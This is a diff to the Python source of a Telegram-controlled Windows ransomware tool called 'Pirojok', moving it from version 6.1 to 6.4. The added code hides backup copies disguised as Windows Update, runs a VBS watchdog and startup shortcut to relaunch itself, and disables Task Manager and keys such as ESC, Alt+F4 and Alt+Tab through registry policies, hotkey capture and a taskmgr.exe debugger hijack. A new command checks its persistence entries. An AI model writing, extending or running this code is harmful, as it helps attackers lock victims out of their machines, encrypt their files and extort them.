@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 Pirojok - ADVANCED RANSOMWARE
-Version 6.1 - FULLY FIXED
+Version 6.4 - FULLY FIXED WITH KEY BLOCKING
 """
 
 import os
@@ -44,6 +44,7 @@ class ProcessHider:
         self.original_name = None
         self.hidden_pid = None
         self.watchdog_file = None
+        self.watchdog_active = False
         
         # Legitimate Windows processes for masquerading
         self.mask_processes = [
@@ -192,45 +193,96 @@ del "%~f0"
         """Create watchdog file to restore if deleted"""
         try:
             if getattr(sys, 'frozen', False):
+                current_exe = sys.executable
+                
                 # Create copies in multiple locations
                 locations = [
                     os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Caches'),
                     os.path.join(os.environ['TEMP'], 'Microsoft'),
-                    os.path.join(os.environ['SystemRoot'], 'Temp', 'MicrosoftUpdate')
+                    os.path.join(os.environ['SystemRoot'], 'Temp', 'MicrosoftUpdate'),
+                    os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'Caches')
                 ]
                 
+                backup_paths = []
                 for loc in locations:
                     try:
                         os.makedirs(loc, exist_ok=True)
                         backup_path = os.path.join(loc, 'wuauclt.exe.bak')
-                        shutil.copy2(sys.executable, backup_path)
+                        shutil.copy2(current_exe, backup_path)
+                        ctypes.windll.kernel32.SetFileAttributesW(backup_path, 2)
+                        backup_paths.append(backup_path)
                     except:
                         pass
                 
                 # Create watchdog script
                 self.watchdog_file = os.path.join(tempfile.gettempdir(), "watchdog.vbs")
                 with open(self.watchdog_file, 'w') as f:
-                    f.write('''
+                    f.write(f'''
 Set WShell = CreateObject("WScript.Shell")
+Set FSO = CreateObject("Scripting.FileSystemObject")
+
+' List of backup locations
+backupPaths = Array({', '.join([f'"{p}"' for p in backup_paths])})
+
 Do While True
+    ' Check if main process is running
     Set objWMIService = GetObject("winmgmts:\\\\.\\root\\cimv2")
-    Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name LIKE '%Pirojok%'")
+    Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name LIKE '%Pirojok%' OR Name LIKE '%wuauclt%'")
     
     If colProcesses.Count = 0 Then
-        WShell.Run "wuauclt.exe", 0, False
+        ' Try to restore from any available backup
+        For Each backupPath In backupPaths
+            If FSO.FileExists(backupPath) Then
+                tempPath = WShell.ExpandEnvironmentStrings("%TEMP%") & "\\wuauclt.exe"
+                FSO.CopyFile backupPath, tempPath, True
+                WShell.Run """" & tempPath & """", 0, False
+                
+                ' Send notification via Telegram (simulated)
+                ' Note: VBS can't directly send Telegram, but we'll log it
+                Exit For
+            End If
+        Next
     End If
     
-    WScript.Sleep 30000
+    WScript.Sleep 30000  ' Check every 30 seconds
 Loop
 ''')
                 
+                # Run watchdog hidden
                 subprocess.Popen(['wscript', '//B', self.watchdog_file], 
                                creationflags=subprocess.CREATE_NO_WINDOW)
                 
-                return "[WATCHDOG] Watchdog activated"
+                # Also add to startup
+                startup_folder = os.path.join(os.getenv('APPDATA'),
+                    r'Microsoft\Windows\Start Menu\Programs\Startup')
+                vbs_script = f'''
+                Set oWS = WScript.CreateObject("WScript.Shell")
+                sLinkFile = "{startup_folder}\\Watchdog.lnk"
+                Set oLink = oWS.CreateShortcut(sLinkFile)
+                oLink.TargetPath = "wscript.exe"
+                oLink.Arguments = "//B "{self.watchdog_file}""
+                oLink.WindowStyle = 0
+                oLink.Save
+                '''
+                vbs_path = os.path.join(tempfile.gettempdir(), "watchdog_startup.vbs")
+                with open(vbs_path, 'w') as f:
+                    f.write(vbs_script)
+                subprocess.run(['cscript', vbs_path, '//nologo'], capture_output=True)
+                os.remove(vbs_path)
+                
+                self.watchdog_active = True
+                self.p.send_message(self.p.owner_id, f"[WATCHDOG] Activated with {len(backup_paths)} backups")
+                return f"[WATCHDOG] Activated with {len(backup_paths)} backups"
             return "[ERROR] Not compiled"
         except Exception as e:
             return f"[ERROR] Watchdog failed: {e}"
+    
+    def check_watchdog(self):
+        """Check if watchdog is active"""
+        if self.watchdog_active:
+            return "[WATCHDOG] Status: ACTIVE"
+        else:
+            return "[WATCHDOG] Status: INACTIVE (use 'watchdog' to activate)"
     
     def get_mask_status(self):
         """Get masquerade status"""
@@ -239,6 +291,7 @@ Loop
         status += f"[MASK] Level: {self.mask_level}/3\n"
         if self.hidden_pid:
             status += f"[MASK] Hidden PID: {self.hidden_pid}\n"
+        status += self.check_watchdog()
         return status
     
     def remove_masks(self):
@@ -281,6 +334,72 @@ class PirojokRansomware:
         self.encryption_key = os.urandom(32)
         return base64.b64encode(self.encryption_key).decode()
     
+    def block_all_keys(self):
+        """FULL key blocking including ESC and Alt+F4"""
+        try:
+            import ctypes
+            from ctypes import wintypes
+            
+            # Block via registry
+            key = winreg.HKEY_CURRENT_USER
+            subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
+            
+            try:
+                winreg.CreateKey(key, subkey)
+                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
+                    winreg.SetValueEx(regkey, "NoWinKeys", 0, winreg.REG_DWORD, 1)
+                    winreg.SetValueEx(regkey, "NoViewContextMenu", 0, winreg.REG_DWORD, 1)
+                    winreg.SetValueEx(regkey, "NoTrayContextMenu", 0, winreg.REG_DWORD, 1)
+                    winreg.SetValueEx(regkey, "NoChangeStartMenu", 0, winreg.REG_DWORD, 1)
+                    winreg.SetValueEx(regkey, "NoClose", 0, winreg.REG_DWORD, 1)
+            except: pass
+            
+            # Disable Task Manager
+            key = winreg.HKEY_CURRENT_USER
+            subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
+            
+            try:
+                winreg.CreateKey(key, subkey)
+                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
+                    winreg.SetValueEx(regkey, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
+                    winreg.SetValueEx(regkey, "DisableLockWorkstation", 0, winreg.REG_DWORD, 1)
+            except: pass
+            
+            # Block Alt+Tab, Alt+F4, ESC via SystemParametersInfo
+            user32 = ctypes.windll.user32
+            user32.SystemParametersInfoW(0x0097, 1, None, 0)  # SPI_SCREENSAVERRUNNING
+            
+            # Register hotkeys to block specific keys
+            # F1-F12
+            for i in range(1, 13):
+                user32.RegisterHotKey(None, i, 0, 0x70 + i - 1)
+            
+            # ESC (VK_ESCAPE = 0x1B)
+            user32.RegisterHotKey(None, 13, 0, 0x1B)
+            
+            # Alt+F4 (MOD_ALT = 0x0001, VK_F4 = 0x73)
+            user32.RegisterHotKey(None, 14, 0x0001, 0x73)
+            
+            # Alt+Tab (MOD_ALT = 0x0001, VK_TAB = 0x09)
+            user32.RegisterHotKey(None, 15, 0x0001, 0x09)
+            
+            # Ctrl+Alt+Del (can't fully block but we can try)
+            # Disable SAS (Secure Attention Sequence)
+            try:
+                key = winreg.HKEY_LOCAL_MACHINE
+                subkey = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe"
+                winreg.CreateKey(key, subkey)
+                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
+                    winreg.SetValueEx(regkey, "Debugger", 0, winreg.REG_SZ, "rundll32.exe")
+            except: pass
+            
+            self.active = True
+            return True
+            
+        except Exception as e:
+            print(f"Error blocking keys: {e}")
+            return False
+    
     def show_cmd_message(self):
         """Show message in CMD window (without key)"""
         try:
@@ -295,7 +414,7 @@ class PirojokRansomware:
 |   DECRYPTION KEY HAS BEEN SENT TO TELEGRAM                   |
 |   CHECK YOUR TELEGRAM BOT FOR THE KEY                        |
 |                                                              |
-|   KEYS F1-F12, ESC, SHIFT, CTRL ARE BLOCKED!                |
+|   KEYS F1-F12, ESC, SHIFT, CTRL, ALT+F4 ARE BLOCKED!        |
 |                                                              |
 |   To unlock, enter decryption key in Telegram bot            |
 |                                                              |
@@ -354,31 +473,6 @@ del "%~f0"
             os.system(f'start /max cmd /c "{bat_path}"')
         except Exception as e:
             print(f"Error showing decrypted message: {e}")
-    
-    def block_all_keys(self):
-        try:
-            import ctypes
-            key = winreg.HKEY_CURRENT_USER
-            subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
-            try:
-                winreg.CreateKey(key, subkey)
-                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
-                    winreg.SetValueEx(regkey, "NoWinKeys", 0, winreg.REG_DWORD, 1)
-            except: pass
-            key = winreg.HKEY_CURRENT_USER
-            subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
-            try:
-                winreg.CreateKey(key, subkey)
-                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
-                    winreg.SetValueEx(regkey, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
-            except: pass
-            user32 = ctypes.windll.user32
-            user32.SystemParametersInfoW(0x0097, 1, None, 0)
-            self.active = True
-            return True
-        except Exception as e:
-            print(f"Error blocking keys: {e}")
-            return False
     
     def encrypt_file(self, filepath):
         try:
@@ -460,7 +554,7 @@ del "%~f0"
 |   DECRYPTION KEY HAS BEEN SENT TO TELEGRAM                   |
 |   CHECK YOUR TELEGRAM BOT                                     |
 |                                                              |
-|   Keys F1-F12, ESC, SHIFT, CTRL are BLOCKED!                 |
+|   Keys F1-F12, ESC, SHIFT, CTRL, ALT+F4 are BLOCKED!        |
 |   Reboot to unlock (will lose files)                         |
 |                                                              |
 +--------------------------------------------------------------+
@@ -473,7 +567,7 @@ del "%~f0"
         try:
             self.p.send_message(self.p.owner_id, "[LOCK] Starting ransomware...")
             self.block_all_keys()
-            self.p.send_message(self.p.owner_id, "[LOCK] Keys blocked!")
+            self.p.send_message(self.p.owner_id, "[LOCK] Keys blocked (ESC, ALT+F4 included)!")
             self.show_cmd_message()
             self.p.send_message(self.p.owner_id, "[CMD] Message shown!")
             encrypted = self.scan_and_encrypt()
@@ -483,7 +577,7 @@ del "%~f0"
             result = f"[OK] Encrypted {len(encrypted)} files\n"
             result += f"[NOTE] {note}\n"
             result += f"[KEY] {base64.b64encode(self.encryption_key).decode()}\n"
-            result += f"[LOCK] Keys blocked!\n"
+            result += f"[LOCK] Keys blocked (ESC, ALT+F4)!\n"
             result += f"[AUTO] Startup installed!"
             return result
         except Exception as e:
@@ -555,7 +649,7 @@ class Pirojok:
         self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
         self.running = True
         self.processes = []
-        self.version = "6.1"
+        self.version = "6.4"
         self.command_timeout = 60
         self.admin_mode = False
         self.startup_time = datetime.now()
@@ -839,6 +933,105 @@ class Pirojok:
         
         return "\n".join(results)
     
+    def check_startup(self):
+        """Check all startup locations for Pirojok entries"""
+        results = []
+        results.append("[STARTUP] Checking all locations:")
+        
+        # Check registry HKCU
+        try:
+            key = winreg.HKEY_CURRENT_USER
+            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            with winreg.OpenKey(key, subkey, 0, winreg.KEY_READ) as regkey:
+                try:
+                    value, _ = winreg.QueryValueEx(regkey, "WindowsUpdateSvc")
+                    results.append(f"[OK] Found in registry: {value}")
+                except:
+                    results.append("[INFO] Not found in registry")
+        except:
+            results.append("[INFO] Could not check registry")
+        
+        # Check startup folder
+        try:
+            startup_folder = os.path.join(os.getenv('APPDATA'),
+                r'Microsoft\Windows\Start Menu\Programs\Startup')
+            if os.path.exists(os.path.join(startup_folder, 'WindowsUpdate.lnk')):
+                results.append("[OK] Found in startup folder")
+            else:
+                results.append("[INFO] Not found in startup folder")
+        except:
+            results.append("[INFO] Could not check startup folder")
+        
+        # Check task scheduler
+        try:
+            result = subprocess.run(['schtasks', '/query', '/tn', 'WindowsUpdateTask'], 
+                                   capture_output=True, text=True)
+            if result.returncode == 0:
+                results.append("[OK] Found in task scheduler (logon)")
+            else:
+                results.append("[INFO] Not found in task scheduler (logon)")
+        except:
+            results.append("[INFO] Could not check task scheduler (logon)")
+        
+        try:
+            result = subprocess.run(['schtasks', '/query', '/tn', 'WindowsUpdateSystem'], 
+                                   capture_output=True, text=True)
+            if result.returncode == 0:
+                results.append("[OK] Found in task scheduler (system)")
+            else:
+                results.append("[INFO] Not found in task scheduler (system)")
+        except:
+            results.append("[INFO] Could not check task scheduler (system)")
+        
+        # Check Winlogon Shell (admin only)
+        if self.admin_mode:
+            try:
+                key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+                key = winreg.HKEY_LOCAL_MACHINE
+                with winreg.OpenKey(key, key_path, 0, winreg.KEY_READ) as regkey:
+                    current_shell, _ = winreg.QueryValueEx(regkey, "Shell")
+                    if getattr(sys, 'frozen', False):
+                        exe_path = sys.executable
+                    else:
+                        exe_path = os.path.abspath(__file__)
+                    if exe_path in current_shell:
+                        results.append("[OK] Found in Winlogon Shell")
+                    else:
+                        results.append("[INFO] Not found in Winlogon Shell")
+            except:
+                results.append("[INFO] Could not check Winlogon Shell")
+        
+        # Check Active Setup (admin only)
+        if self.admin_mode:
+            try:
+                key = winreg.HKEY_LOCAL_MACHINE
+                subkey = r"SOFTWARE\Microsoft\Active Setup\Installed Components"
+                found = False
+                i = 0
+                while True:
+                    try:
+                        guid = winreg.EnumKey(key, subkey, i)
+                        guid_key = os.path.join(subkey, guid)
+                        with winreg.OpenKey(key, guid_key, 0, winreg.KEY_READ) as gkey:
+                            stub, _ = winreg.QueryValueEx(gkey, "StubPath")
+                            if getattr(sys, 'frozen', False) and sys.executable in stub:
+                                found = True
+                                break
+                        i += 1
+                    except WindowsError:
+                        break
+                if found:
+                    results.append("[OK] Found in Active Setup")
+                else:
+                    results.append("[INFO] Not found in Active Setup")
+            except:
+                results.append("[INFO] Could not check Active Setup")
+        
+        # Check watchdog
+        results.append(self.hider.check_watchdog())
+        
+        return "\n".join(results)
+    
     def send_message(self, chat_id, text):
         """Simple message sending with plain text"""
         try:
@@ -1045,7 +1238,7 @@ class Pirojok:
             # === HELP / MENU ===
             if text == "help" or text == "menu":
                 help_text = """
-PIROJOK v6.1 - COMMANDS:
+PIROJOK v6.4 - COMMANDS:
 
 [LOCK] RANSOMWARE:
 • ransom / ransom_start - START RANSOMWARE!
@@ -1085,6 +1278,7 @@ PIROJOK v6.1 - COMMANDS:
 • explorer_shell - with explorer.exe
 • active_setup - for all users
 • startup_remove_all - remove all
+• startup_check - check all startup locations
 
 [MAIN] BASIC:
 • cmd <command> - run command
@@ -1346,6 +1540,12 @@ PIROJOK v6.1 - COMMANDS:
             
             if text == "startup_remove_all":
                 result = self.remove_all_startup()
+                self.send_message(chat_id, result)
+                self.processing = False
+                return
+            
+            if text == "startup_check":
+                result = self.check_startup()
                 self.send_message(chat_id, result)
                 self.processing = False
                 return
